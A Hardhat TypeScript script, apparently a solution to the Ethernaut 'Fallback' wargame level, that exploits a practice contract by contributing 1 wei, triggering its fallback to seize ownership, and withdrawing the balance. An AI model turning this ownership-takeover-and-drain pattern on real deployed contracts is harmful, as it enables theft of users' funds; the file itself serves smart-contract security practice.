import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

async function fallbackExploit() {
  const fallbackInstanceAddress = process.env.FALLBACK_ADDRESS!;
  const accounts = await ethers.getSigners();
  const attacker = accounts[0];
  const isDevelopmentNetwork = ethers.provider.network.name in developmentNetworks;

  const fallback = await ethers.getContractAt("Fallback", fallbackInstanceAddress);

  let tx = await fallback.connect(attacker).contribute({ value: ethers.utils.parseUnits("1", "wei") });

  if (!isDevelopmentNetwork) console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  tx.wait();

  tx = await attacker.sendTransaction({ to: fallbackInstanceAddress, value: ethers.utils.parseUnits("1", "wei") });

  if (!isDevelopmentNetwork) console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  tx.wait();

  tx = await fallback.connect(attacker).withdraw();

  if (!isDevelopmentNetwork) console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  tx.wait();

  console.log("SUCCESS!!! Submit the instance");
}

fallbackExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
